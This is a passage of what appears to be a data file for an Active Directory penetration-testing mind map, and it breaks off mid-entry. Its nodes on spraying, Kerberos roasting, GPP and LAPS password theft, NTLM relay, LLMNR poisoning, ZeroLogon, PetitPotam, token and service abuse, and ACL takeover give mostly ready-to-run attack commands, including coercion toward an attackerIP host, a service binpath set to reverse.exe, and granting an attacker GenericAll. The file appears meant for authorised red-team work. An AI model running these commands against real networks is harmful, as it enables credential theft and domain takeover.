                            descriptionMd: '### Access Control List Analysis\nAudit discretionary access control lists (DACLs) to identify permission misconfigurations. Non-standard ACEs on privileged objects often provide hidden escalation paths that traditional enumeration misses.\n\nDangerous Permissions:\n GenericAll: Full control over object\n* WriteDacl: Modify object permissions (grant self full control)\n* WriteOwner: Take ownership (then grant permissions)\n* GenericWrite: Modify most object properties\n* WriteProperty: Modify specific properties\n* ForceChangePassword: Reset user passwords without current\n* AddMember: Add to groups (including privileged)\n* Self (Write) on Member: Add self to group\n\nHigh-Value ACL Targets:\n* Domain Admins group\n* Enterprise Admins group\n* Administrator accounts\n* Domain Controllers OU\n* GPOs linked to privileged OUs\n* Service accounts with SPNs\n* Certificate templates',
                            commands: [{
                                    description: 'Find Interesting ACLs',
                                    code: 'Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl|WriteOwner"}'
                                },
                                {
                                    description: 'ACLs for Specific Object',
                                    code: 'Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs'
                                },
                                {
                                    description: 'Find User ACL Abuse',
                                    code: 'Get-DomainObjectAcl -SamAccountName user -ResolveGUIDs | Select-Object ObjectDN,ActiveDirectoryRights'
                                },
                                {
                                    description: 'PowerView ACL Scanner',
                                    code: 'Invoke-ACLScanner -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "Domain Users|Authenticated Users"}'
                                },
                                {
                                    description: 'BloodHound ACL Query',
                                    code: 'MATCH p=(u:User)-[r:GenericAll|WriteDacl|WriteOwner]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN p'
                                },
                                {
                                    description: 'Native PowerShell',
                                    code: 'Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=domain,DC=local" | Select-Object -ExpandProperty Access'
                                }
                            ],
                            type: 'technique',
                            emoji: '🔐',
                            resources: [{
                                    title: 'ACL Attack Guide',
                                    url: 'https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse'
                                },
                                {
                                    title: 'BloodHound ACE Abuse',
                                    url: 'https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html'
                                },
                                {
                                    title: 'PowerView ACL Functions',
                                    url: 'https://powersploit.readthedocs.io/en/latest/Recon/'
                                }
                            ]
                        },
                        children: []
                    }
                ]
            },

            {
                id: 'ad-initial',
                data: {
                    label: 'Initial Access',
                    description: 'Credential Entry',
                    descriptionMd: '### Initial Access\nObtain a legitimate foothold through approved testing paths (test accounts, exposed services, or validated weaknesses). This phase focuses on identifying and exploiting initial entry vectors while respecting engagement boundaries.\n\n**Key Objectives:**\n* Identify authentication surfaces and weak points\n* Validate credential-based access paths\n* Discover exploitable service configurations\n* Establish initial foothold within ROE\n',
                    commands: [],
                    type: 'category',
                    emoji: '🔑',
                    resources: [{
                            title: 'MITRE ATT&CK: Initial Access',
                            url: 'https://attack.mitre.org/tactics/TA0001/'
                        },
                        {
                            title: 'Active Directory Security',
                            url: 'https://adsecurity.org/'
                        }
                    ]
                },
                children: [{
                        id: 'ad-auth-surface',
                        data: {
                            label: 'Auth Surface Review',
                            description: 'VPN, RDP, OWA, SSO, legacy endpoints',
                            descriptionMd: '### Authentication Surface Review\nInventory all authentication entry points and identify policy mismatches: MFA gaps, legacy auth protocols, weak conditional access rules, and inconsistent account lockout policies.\n\n**Common Entry Points:**\n* VPN endpoints (Cisco, Palo Alto, Pulse Secure)\n* Remote Desktop Services (RDP)\n* Outlook Web Access (OWA) / Exchange\n* Single Sign-On portals (ADFS, Azure AD)\n* SharePoint & Office 365\n* Legacy protocols (NTLM, SMB, LDAP)\n* Web applications with Windows auth\n\n**Red Flags:**\n* MFA not enforced on all external access\n* Legacy authentication still enabled\n* No conditional access policies\n* Mixed authentication methods\n* Publicly exposed domain-joined services\n',
                            commands: [{
                                    description: 'Test NTLM Auth',
                                    code: 'curl -k --ntlm -u "domain\\user:pass" https://target.com'
                                },
                                {
                                    description: 'Check OWA Login',
                                    code: 'curl -k https://mail.domain.com/owa/auth/logon.aspx'
                                },
                                {
                                    description: 'ADFS User Realm Check',
                                    code: 'curl "https://login.microsoftonline.com/getuserrealm.srf?login=user@domain.com"'
                                }
                            ],
                            type: 'technique',
                            emoji: '🧭',
                            resources: [{
                                title: 'Auth Methods Overview',
                                url: 'https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/windows-authentication-overview'
                            }]
                        },
                        children: []
                    },
                    {
                        id: 'spray',
                        data: {
                            label: 'Password Spraying',
                            description: 'Lockout-safe credential validation',
                            descriptionMd: '### Password Spraying\nValidate account lockout thresholds and test for weak password exposure **within Rules of Engagement**. Always prefer measured validation with explicit stakeholder approval to avoid production impact.\n\n**Safe Testing Practices:**\n* Never exceed lockout threshold minus 2\n* Distribute attempts over observation window\n* Test common weak passwords: Season+Year, Company name\n* Monitor for account lockouts\n* Maintain detailed logs of all attempts\n\n**Common Weak Patterns:**\n* CompanyName + current year/123\n* Season + current year (Winter2024)\n* Password1, Password123\n* Welcome1, Welcome123\n* Default service account passwords\n',
                            commands: [{
                                    description: 'Spray with Kerbrute',
                                    code: 'kerbrute passwordspray -d domain.local --dc 10.0.0.1 users.txt "Winter2024"'
                                },
                                {
                                    description: 'CrackMapExec Spray',
                                    code: 'crackmapexec smb 10.0.0.1 -u users.txt -p "Password123" --continue-on-success'
                                },
                                {
                                    description: 'RDP Password Spray',
                                    code: 'crowbar -b rdp -s 10.0.0.1/24 -u user -C passwords.txt'
                                },
                                {
                                    description: 'OWA/O365 Spray',
                                    code: 'python3 o365spray.py --spray -U users.txt -p "Winter2024!" --count 1 --lockout 5'
                                },
                                {
                                    description: 'SMB Spray Safe Mode',
                                    code: 'crackmapexec smb targets.txt -u users.txt -p pass.txt --no-bruteforce --continue-on-success'
                                }
                            ],
                            type: 'tool',
                            emoji: '🔓',
                            resources: [{
                                    title: 'Password Spraying Guide',
                                    url: 'https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/'
                                },
                                {
                                    title: 'CrackMapExec Wiki',
                                    url: 'https://wiki.porchetta.industries/'
                                },
                                {
                                    title: 'Spray Tactics',
                                    url: 'https://github.com/dafthack/DomainPasswordSpray'
                                }
                            ]
                        },
                        children: []
                    },
                    {
                        id: 'asreproast',
                        data: {
                            label: 'AS-REP Roasting',
                            description: 'Kerberos preauth disabled accounts',
                            descriptionMd: '### AS-REP Roasting\nExploit user accounts with Kerberos pre-authentication disabled. When DONT_REQ_PREAUTH is set, you can request AS-REP messages for offline cracking without valid credentials.\n\n**Attack Flow:**\n1. Identify users with preauth disabled (UF_DONT_REQUIRE_PREAUTH)\n2. Request AS-REP for those accounts\n3. Extract encrypted timestamp\n4. Crack offline with hashcat/john\n\n**Why It Works:**\nNormal Kerberos requires proving identity before receiving encrypted material. Accounts without preauth return encrypted data to anyone who asks.\n\n**Detection Risk:** Low - Appears as normal Kerberos traffic\n',
                            commands: [{
                                    description: 'Impacket AS-REP Roast',
                                    code: 'GetNPUsers.py domain.local/ -dc-ip 10.0.0.1 -usersfile users.txt -format hashcat -outputfile asrep.hash'
                                },
                                {
                                    description: 'Rubeus AS-REP Roast',
                                    code: 'Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash'
                                },
                                {
                                    description: 'With Valid Creds',
                                    code: 'GetNPUsers.py domain.local/user:pass -dc-ip 10.0.0.1 -request'
                                },
                                {
                                    description: 'Crack with Hashcat',
                                    code: 'hashcat -m 18200 asrep.hash wordlist.txt'
                                },
                                {
                                    description: 'Crack with John',
                                    code: 'john --wordlist=rockyou.txt asrep.hash'
                                }
                            ],
                            type: 'technique',
                            emoji: '🎟️',
                            resources: [{
                                    title: 'AS-REP Roasting Explained',
                                    url: 'https://www.hackingarticles.in/as-rep-roasting/'
                                },
                                {
                                    title: 'Harmj0y AS-REP Post',
                                    url: 'https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/'
                                },
                                {
                                    title: 'Impacket GetNPUsers',
                                    url: 'https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py'
                                }
                            ]
                        },
                        children: []
                    },
                    {
                        id: 'kerberoast',
                        data: {
                            label: 'Kerberoasting',
                            description: 'Service account SPN exploitation',
                            descriptionMd: '### Kerberoasting\nRequest service tickets (TGS) for accounts with Service Principal Names (SPNs) and crack the encrypted tickets offline. Valid domain credentials required.\n\n**Attack Flow:**\n1. Query LDAP for accounts with SPNs set\n2. Request TGS for each SPN (valid user required)\n3. Extract ticket encrypted with service account password\n4. Crack offline (RC4 or AES encryption)\n\n**High-Value Targets:**\n* MSSQLSvc accounts (often SQL sa-equivalent)\n* HTTP service accounts\n* Accounts with AdminCount=1\n* Service accounts in privileged groups\n* Old accounts with weak passwords\n\n**Cracking Priority:**\n* RC4 tickets (23) easier than AES (17/18)\n* Older service accounts more likely weak\n* Accounts that haven\'t changed passwords in years\n',
                            commands: [{
                                    description: 'Impacket Kerberoast',
                                    code: 'GetUserSPNs.py domain.local/user:pass -dc-ip 10.0.0.1 -request -outputfile kerberoast.hash'
                                },
                                {
                                    description: 'Rubeus Kerberoast',
                                    code: 'Rubeus.exe kerberoast /format:hashcat /outfile:tickets.txt'
                                },
                                {
                                    description: 'Target Specific User',
                                    code: 'GetUserSPNs.py domain.local/user:pass -dc-ip 10.0.0.1 -request-user sqlsvc'
                                },
                                {
                                    description: 'PowerView Kerberoast',
                                    code: 'Invoke-Kerberoast -OutputFormat Hashcat | fl'
                                },
                                {
                                    description: 'Crack RC4 Tickets',
                                    code: 'hashcat -m 13100 kerberoast.hash wordlist.txt'
                                },
                                {
                                    description: 'Crack AES Tickets',
                                    code: 'hashcat -m 19700 kerberoast.hash wordlist.txt'
                                }
                            ],
                            type: 'technique',
                            emoji: '🎟️',
                            resources: [{
                                    title: 'Kerberoasting Guide',
                                    url: 'https://attack.mitre.org/techniques/T1558/003/'
                                },
                                {
                                    title: 'Cracking Kerberos TGS',
                                    url: 'https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a'
                                },
                                {
                                    title: 'Rubeus Toolkit',
                                    url: 'https://github.com/GhostPack/Rubeus'
                                }
                            ]
                        },
                        children: []
                    },
                    {
                        id: 'ad-gpp',
                        data: {
                            label: 'GPP Passwords / SYSVOL Secrets',
                            description: 'Legacy credential storage',
                            descriptionMd: '### Group Policy Preferences Passwords\nExtract credentials from legacy Group Policy Preferences (GPP) files stored in SYSVOL. Microsoft published the AES key for these in 2012, making extraction trivial.\n\n**Common Locations:**\n* Groups.xml (local admin passwords)\n* Services.xml (service account credentials)\n* Scheduledtasks.xml (scheduled task accounts)\n* Datasources.xml (database connection strings)\n* Drives.xml (mapped drive credentials)\n\n**Other SYSVOL Secrets:**\n* Scripts with embedded credentials\n* VBS/PS1 files with passwords\n* Configuration files\n* Backup files with sensitive data\n\n**Access Required:** Any domain user can read SYSVOL\n',
                            commands: [{
                                    description: 'Find GPP Passwords',
                                    code: 'findstr /S /I cpassword \\\\domain.local\\sysvol\\*.xml'
                                },
                                {
                                    description: 'Get-GPPPassword (PowerSploit)',
                                    code: 'Get-GPPPassword'
                                },
                                {
                                    description: 'Decrypt cPassword',
                                    code: 'gpp-decrypt "encrypted_cpassword_value"'
                                },
                                {
                                    description: 'CrackMapExec GPP',
                                    code: 'crackmapexec smb 10.0.0.1 -u user -p pass -M gpp_password'
                                },
                                {
                                    description: 'Manual SYSVOL Search',
                                    code: 'find \\\\domain.local\\sysvol -iname "*.xml" -o -iname "*.ini" -o -iname "*.vbs"'
                                },
                                {
                                    description: 'Grep for Passwords',
                                    code: 'grep -ri "password\\|passwd\\|pwd" \\\\domain.local\\sysvol\\'
                                }
                            ],
                            type: 'technique',
                            emoji: '📦',
                            resources: [{
                                    title: 'GPP Password Attack',
                                    url: 'https://adsecurity.org/?p=2288'
                                },
                                {
                                    title: 'Get-GPPPassword Script',
                                    url: 'https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1'
                                },
                                {
                                    title: 'MS14-025 Bulletin',
                                    url: 'https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30'
                                }
                            ]
                        },
                        children: []
                    },
                    {
                        id: 'ad-laps',
                        data: {
                            label: 'LAPS Exploitation',
                            description: 'Local admin password disclosure',
                            descriptionMd: '### LAPS Exploitation\nLocal Administrator Password Solution (LAPS) stores unique local admin passwords in AD attributes. If ACLs are misconfigured, unprivileged users may read these passwords.\n\n**Attack Vectors:**\n* Read ms-Mcs-AdmPwd attribute (cleartext password)\n* Abuse extended rights to read passwords\n* Exploit "All Extended Rights" permission\n* Compromise accounts with LAPS read permissions\n\n**LAPS Attributes:**\n* ms-Mcs-AdmPwd: Current local admin password (cleartext)\n* ms-Mcs-AdmPwdExpirationTime: When password expires\n\n**Why This Matters:**\nLAPS passwords often grant local admin to workstations/servers, enabling lateral movement and privilege escalation.\n',
                            commands: [{
                                    description: 'Check LAPS Install',
                                    code: 'Get-ADObject "CN=ms-Mcs-AdmPwd,CN=Schema,CN=Configuration,DC=domain,DC=local"'
                                },
                                {
                                    description: 'Find LAPS Passwords (PowerView)',
                                    code: 'Get-DomainComputer | Get-DomainObject -Properties ms-Mcs-AdmPwd'
                                },
                                {
                                    description: 'CrackMapExec LAPS',
                                    code: 'crackmapexec ldap 10.0.0.1 -u user -p pass --module laps'
                                },
                                {
                                    description: 'Specific Computer LAPS',
                                    code: 'Get-ADComputer WS01 -Properties ms-Mcs-AdmPwd'
                                },
                                {
                                    description: 'LAPSToolkit Dump',
                                    code: 'Get-LAPSComputers'
                                },
                                {
                                    description: 'Find LAPS Readers',
                                    code: 'Find-LAPSDelegatedGroups'
                                }
                            ],
                            type: 'technique',
                            emoji: '🔐',
                            resources: [{
                                    title: 'LAPS Security',
                                    url: 'https://adsecurity.org/?p=3164'
                                },
                                {
                                    title: 'LAPSToolkit',
                                    url: 'https://github.com/leoloobeek/LAPSToolkit'
                                },
                                {
                                    title: 'LAPS Exploitation',
                                    url: 'https://www.hackingarticles.in/credential-dumping-local-administrator-password-solution-laps/'
                                }
                            ]
                        },
                        children: []
                    },
                    {
                        id: 'ad-ntlm-relay',
                        data: {
                            label: 'NTLM Relay Attacks',
                            description: 'Authentication relay to privileged services',
                            descriptionMd: '### NTLM Relay Attacks\nIntercept and relay NTLM authentication to gain unauthorized access to services. Works when SMB signing is not enforced or when relaying to different protocols.\n\n**Attack Requirements:**\n* SMB signing disabled or not required\n* Ability to trigger authentication (mitm, responder, printerbug)\n* Target service accepts NTLM auth\n\n**Common Relay Targets:**\n* SMB shares (file access, admin shares)\n* HTTP/HTTPS (EWS, OWA)\n* LDAP/LDAPS (DCSync, user creation)\n* SMB to LDAPS (RBCD attack, shadow credentials)\n\n**High-Impact Relays:**\n* Relay to LDAPS with machine account → DCSync\n* Relay to HTTP → credential harvesting\n* Cross-protocol relays (SMB→HTTP, HTTP→LDAP)\n',
                            commands: [{
                                    description: 'Start ntlmrelayx to SMB',
                                    code: 'ntlmrelayx.py -tf targets.txt -smb2support'
                                },
                                {
                                    description: 'Relay to LDAPS (DCSync)',
                                    code: 'ntlmrelayx.py -t ldaps://dc.domain.local --escalate-user normaluser'
                                },
                                {
                                    description: 'Relay with Command Exec',
                                    code: 'ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"'
                                },
                                {
                                    description: 'Responder + Relay',
                                    code: 'responder -I eth0 -v'
                                },
                                {
                                    description: 'Trigger with Printerbug',
                                    code: 'python3 printerbug.py domain.local/user:pass@target attackerIP'
                                },
                                {
                                    description: 'Check SMB Signing',
                                    code: 'crackmapexec smb targets.txt --gen-relay-list relay-targets.txt'
                                }
                            ],
                            type: 'technique',
                            emoji: '🔄',
                            resources: [{
                                    title: 'NTLM Relay Guide',
                                    url: 'https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html'
                                },
                                {
                                    title: 'Impacket ntlmrelayx',
                                    url: 'https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py'
                                },
                                {
                                    title: 'Responder Tool',
                                    url: 'https://github.com/lgandx/Responder'
                                }
                            ]
                        },
                        children: []
                    },
                    {
                        id: 'ad-poisoning',
                        data: {
                            label: 'LLMNR/NBT-NS Poisoning',
                            description: 'Network protocol poisoning for credential capture',
                            descriptionMd: '### LLMNR/NBT-NS/mDNS Poisoning\nCapture credentials by responding to Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) broadcasts when DNS fails.\n\n**Attack Flow:**\n1. Listen for LLMNR/NBT-NS broadcast queries\n2. Respond claiming to be the requested host\n3. Victim connects and sends NTLM auth\n4. Capture NTLMv2 hash for offline cracking\n\n**Why It Works:**\nWindows falls back to LLMNR/NBT-NS when DNS resolution fails. Misconfigured shares, scripts, or applications trigger these broadcasts regularly.\n\n**Captured Credentials:**\n* NTLMv2 hashes (crack offline)\n* Plaintext if downgrade successful\n* Machine account hashes (valuable for relay)\n',
                            commands: [{
                                    description: 'Responder Basic',
                                    code: 'responder -I eth0 -w -v'
                                },
                                {
                                    description: 'Responder No SMB/HTTP (Relay)',
                                    code: 'responder -I eth0 -v -w -d -P'
                                },
                                {
                                    description: 'Inveigh (PowerShell)',
                                    code: 'Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y'
                                },
                                {
                                    description: 'Crack NTLMv2',
                                    code: 'hashcat -m 5600 captured.hash wordlist.txt'
                                },
                                {
                                    description: 'Mitm6 (IPv6)',
                                    code: 'mitm6 -d domain.local'
                                }
                            ],
                            type: 'technique',
                            emoji: '📡',
                            resources: [{
                                    title: 'Responder Guide',
                                    url: 'https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/'
                                },
                                {
                                    title: 'Inveigh Wiki',
                                    url: 'https://github.com/Kevin-Robertson/Inveigh'
                                },
                                {
                                    title: 'Mitm6 Attack',
                                    url: 'https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/'
                                }
                            ]
                        },
                        children: []
                    },
                    {
                        id: 'ad-zerologon',
                        data: {
                            label: 'ZeroLogon (CVE-2020-1472)',
                            description: 'Domain Controller privilege escalation',
                            descriptionMd: '### ZeroLogon - CVE-2020-1472\nCritical vulnerability allowing attackers to set empty passwords on domain controller machine accounts, leading to instant domain compromise.\n\n**Attack Flow:**\n1. Exploit cryptographic flaw in Netlogon authentication\n2. Set DC machine account password to empty string\n3. Use empty password to authenticate and dump credentials\n4. Restore original password or face domain outage\n\n**Impact:** Complete domain compromise in minutes\n\n**Warning:** Extremely destructive if original password not restored. DC will fail authentication and break domain trust. Only use in controlled environments with explicit approval.\n\n**Detection:** High - Creates distinctive network patterns and event logs\n',
                            commands: [{
                                    description: 'Check Vulnerability',
                                    code: 'python3 zerologon_tester.py DC-HOSTNAME 10.0.0.1'
                                },
                                {
                                    description: 'Exploit ZeroLogon',
                                    code: 'python3 cve-2020-1472-exploit.py DC-HOSTNAME 10.0.0.1'
                                },
                                {
                                    description: 'SecretsDump After Exploit',
                                    code: 'secretsdump.py -no-pass "DOMAIN/DC-HOSTNAME$@10.0.0.1"'
                                },
                                {
                                    description: 'Restore Password',
                                    code: 'python3 restorepassword.py DOMAIN/administrator@DC-HOSTNAME -target-ip 10.0.0.1 -hexpass <hex>'
                                }
                            ],
                            type: 'technique',
                            emoji: '⚠️',
                            resources: [{
                                    title: 'ZeroLogon Explained',
                                    url: 'https://www.secura.com/blog/zero-logon'
                                },
                                {
                                    title: 'Exploit PoC',
                                    url: 'https://github.com/dirkjanm/CVE-2020-1472'
                                },
                                {
                                    title: 'MS Advisory',
                                    url: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472'
                                }
                            ]
                        },
                        children: []
                    },
                    {
                        id: 'ad-petitpotam',
                        data: {
                            label: 'PetitPotam',
                            description: 'Force NTLM auth from DC',
                            descriptionMd: '### PetitPotam Attack\nCoerce domain controllers to authenticate via MS-EFSRPC, enabling NTLM relay attacks against ADCS or other services. No credentials required.\n\n**Attack Flow:**\n1. Call EfsRpcOpenFileRaw on target DC\n2. DC authenticates to attacker-controlled host\n3. Relay DC machine account authentication\n4. Request certificate or escalate privileges\n\n**Common Chains:**\n* PetitPotam → NTLM relay → ADCS → Domain Admin\n* PetitPotam → Relay to LDAPS → Shadow Credentials\n* PetitPotam → Relay to LDAPS → DCSync rights\n\n**Mitigations Bypass:** Works even with SMB signing, EPA partially\n',
                            commands: [{
                                    description: 'Basic PetitPotam',
                                    code: 'python3 PetitPotam.py attackerIP targetDC'
                                },
                                {
                                    description: 'With Target Pipe',
                                    code: 'python3 PetitPotam.py -pipe all attackerIP targetDC'
                                },
                                {
                                    description: 'Chain with ntlmrelayx',
                                    code: 'ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp -smb2support --adcs'
                                },
                                {
                                    description: 'Alternative: DFSCoerce',
                                    code: 'python3 dfscoerce.py -u user -p pass attackerIP targetDC'
                                }
                            ],
                            type: 'technique',
                            emoji: '🎣',
                            resources: [{
                                    title: 'PetitPotam Tool',
                                    url: 'https://github.com/topotam/PetitPotam'
                                },
                                {
                                    title: 'ADCS Attack Chain',
                                    url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2'
                                },
                                {
                                    title: 'Coercion Methods',
                                    url: 'https://github.com/p0dalirius/Coercer'
                                }
                            ]
                        },
                        children: []
                    }
                ]
            },

            {
                id: 'ad-privesc',
                data: {
                    label: 'Privilege Escalation',
                    description: 'Elevate Rights',
                    descriptionMd: '### Privilege Escalation\nFind misconfigurations, delegation weaknesses, and ACL issues that create admin-equivalent outcomes. This phase focuses on moving from standard user to privileged access through various Active Directory weaknesses.\n\n**Key Areas:**\n* Local privilege escalation paths\n* ACL and delegation abuse\n* GPO modification rights\n* Certificate Services misconfigurations\n* Kerberos delegation flaws\n* Directory replication rights\n',
                    commands: [],
                    type: 'category',
                    emoji: '👑',
                    resources: [{
                            title: 'AD Security Best Practices',
                            url: 'https://adsecurity.org/'
                        },
                        {
                            title: 'BloodHound Documentation',
                            url: 'https://bloodhound.readthedocs.io/'
                        }
                    ]
                },
                children: [{
                        id: 'local-admin',
                        data: {
                            label: 'Local Admin Paths',
                            description: 'Groups, services, token abuse',
                            descriptionMd: '### Local Admin Paths\nValidate how local admin is granted (groups, GPO, imaging baselines) and where it can be abused via misconfigured services or writable paths.\n\n**Common Vectors:**\n* Unquoted service paths\n* Writable service binaries\n* DLL hijacking opportunities\n* Scheduled tasks with elevated privileges\n* Auto-elevate registry keys\n* Local admin group membership via nested groups\n',
                            commands: [{
                                    description: 'Enumerate local admins',
                                    code: 'net localgroup administrators'
                                },
                                {
                                    description: 'PowerView local admin enum',
                                    code: 'Get-NetLocalGroupMember -GroupName Administrators'
                                },
                                {
                                    description: 'Find unquoted service paths',
                                    code: 'wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """'
                                },
                                {
                                    description: 'Check writable services',
                                    code: 'Get-WmiObject win32_service | Select-Object Name, PathName | Where-Object {$_.PathName -notmatch "C:\\Windows"} | ForEach-Object { icacls $_.PathName }'
                                },
                                {
                                    description: 'SharpUp privilege check',
                                    code: 'SharpUp.exe audit'
                                }
                            ],
                            type: 'technique',
                            emoji: '👤',
                            resources: [{
                                    title: 'Windows Privilege Escalation Guide',
                                    url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md'
                                },
                                {
                                    title: 'SharpUp Tool',
                                    url: 'https://github.com/GhostPack/SharpUp'
                                }
                            ]
                        },
                        children: [{
                                id: 'service-abuse',
                                data: {
                                    label: 'Service Account Abuse',
                                    description: 'Weak service permissions',
                                    descriptionMd: '### Service Account Abuse\nExploit services running with elevated privileges that have weak permissions on their executable, registry keys, or configuration.\n\n**Attack Vectors:**\n* Modify service binary path\n* Replace service executable\n* DLL side-loading\n* Registry-based service manipulation\n* Service unquoted path exploitation\n\n**Detection Tips:** Look for services with WriteDACL, WriteOwner, or GenericWrite permissions for non-admin users.\n',
                                    commands: [{
                                            description: 'Service permissions check',
                                            code: 'accesschk.exe /accepteula -uwcqv "Authenticated Users" *'
                                        },
                                        {
                                            description: 'Modify service binary path',
                                            code: 'sc config [service] binpath= "C:\\temp\\reverse.exe"'
                                        },
                                        {
                                            description: 'PowerUp service abuse check',
                                            code: 'Invoke-AllChecks | Where-Object {$_.AbuseFunction -match "Service"}'
                                        },
                                        {
                                            description: 'Check service DACLs',
                                            code: 'Get-ServiceAcl -Name [service]'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '⚙️',
                                    resources: [{
                                            title: 'AccessChk Documentation',
                                            url: 'https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk'
                                        },
                                        {
                                            title: 'PowerUp',
                                            url: 'https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc'
                                        }
                                    ]
                                },
                                children: []
                            },
                            {
                                id: 'token-manipulation',
                                data: {
                                    label: 'Token Manipulation',
                                    description: 'Steal and impersonate tokens',
                                    descriptionMd: '### Token Manipulation\nSteal access tokens from privileged processes or sessions to impersonate higher-privileged accounts without needing credentials.\n\n**Techniques:**\n* Token theft from running processes\n* Token impersonation (SeImpersonatePrivilege)\n* Primary token duplication\n* Named pipe impersonation\n* Potato family attacks (JuicyPotato, RoguePotato, etc.)\n\n**Prerequisites:** Usually requires SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege.\n',
                                    commands: [{
                                            description: 'Incognito list tokens',
                                            code: 'incognito.exe list_tokens -u'
                                        },
                                        {
                                            description: 'Incognito impersonate',
                                            code: 'incognito.exe execute -c "DOMAIN\\Administrator" cmd.exe'
                                        },
                                        {
                                            description: 'Check token privileges',
                                            code: 'whoami /priv'
                                        },
                                        {
                                            description: 'JuicyPotato exploit',
                                            code: 'JuicyPotato.exe -l 1337 -p C:\\windows\\system32\\cmd.exe -a "/c net localgroup administrators user /add" -t *'
                                        },
                                        {
                                            description: 'Rubeus token manipulation',
                                            code: 'Rubeus.exe triage'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🎭',
                                    resources: [{
                                            title: 'Token Manipulation Overview',
                                            url: 'https://attack.mitre.org/techniques/T1134/'
                                        },
                                        {
                                            title: 'JuicyPotato',
                                            url: 'https://github.com/ohpe/juicy-potato'
                                        },
                                        {
                                            title: 'Token Privileges Guide',
                                            url: 'https://github.com/hatRiot/token-priv'
                                        }
                                    ]
                                },
                                children: []
                            }
                        ]
                    },
                    {
                        id: 'acl-abuse',
                        data: {
                            label: 'ACL & Delegation',
                            description: 'WriteDACL, GenericAll, shadow admins',
                            descriptionMd: '### ACL & Delegation\nLook for "shadow admin" edges where directory permissions effectively allow takeover of users, groups, OUs, or GPOs.\n\n**Dangerous Permissions:**\n* **GenericAll**: Full control over object\n* **WriteDACL**: Modify object permissions\n* **WriteOwner**: Take ownership of object\n* **GenericWrite**: Modify most object attributes\n* **WriteProperty**: Write specific properties\n* **AllExtendedRights**: Execute all extended operations\n* **ForceChangePassword**: Reset user password\n* **Self (Self-Membership)**: Add self to group\n\n**Attack Path:** User1 -[WriteDACL]-> User2 -[GenericAll]-> AdminGroup → Domain Admin\n',
                            commands: [{
                                    description: 'BloodHound ACL analysis',
                                    code: 'SharpHound.exe -c ACL,ObjectProps'
                                },
                                {
                                    description: 'PowerView ACL enumeration',
                                    code: 'Find-InterestingDomainAcl -ResolveGUIDs'
                                },
                                {
                                    description: 'Get object ACL',
                                    code: 'Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs'
                                },
                                {
                                    description: 'Add user to group via ACL',
                                    code: 'Add-DomainGroupMember -Identity "Domain Admins" -Members "user"'
                                },
                                {
                                    description: 'Modify ACL with PowerView',
                                    code: 'Add-DomainObjectAcl -TargetIdentity "user" -PrincipalIdentity "attacker" -Rights All'
                                }
                            ],
                            type: 'technique',
                            emoji: '🧬',
                            resources: [{
                                    title: 'ACL Attack Paths',
                                    url: 'https://posts.specterops.io/an-ace-up-the-sleeve-designing-active-directory-dacl-backdoors-28b1f3d11e6e'
                                },
                                {
                                    title: 'BloodHound ACL Guide',
                                    url: 'https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html'
                                }
                            ]
                        },
                        children: [{
                                id: 'writedacl-abuse',
                                data: {
                                    label: 'WriteDACL Abuse',
                                    description: 'Modify object permissions',
                                    descriptionMd: '### WriteDACL Abuse\nWriteDACL permission allows modifying the security descriptor of an object, enabling an attacker to grant themselves any permission.\n\n**Attack Flow:**\n1. Identify object with WriteDACL permission\n2. Grant GenericAll to controlled principal\n3. Execute desired action (reset password, modify group, etc.)\n4. Optional: Restore original ACL to hide tracks\n\n**Impact:** Can lead to complete object compromise and privilege escalation paths.\n',
                                    commands: [{
                                            description: 'Find WriteDACL permissions',
                                            code: 'Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteDacl"}'
                                        },
                                        {
                                            description: 'Grant GenericAll via PowerView',
                                            code: 'Add-DomainObjectAcl -TargetIdentity "target-user" -PrincipalIdentity "attacker" -Rights All -Verbose'
                                        },
                                        {
                                            description: 'Grant GenericAll via PowerShell AD',
                                            code: '$acl = Get-Acl "AD:\\CN=User,DC=domain,DC=com"; $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule([Principal],"GenericAll","Allow"); $acl.AddAccessRule($ace); Set-Acl -AclObject $acl -Path "AD:\\CN=User,DC=domain,DC=com"'
                                        },
                                        {
                                            description: 'Impacket dacledit',
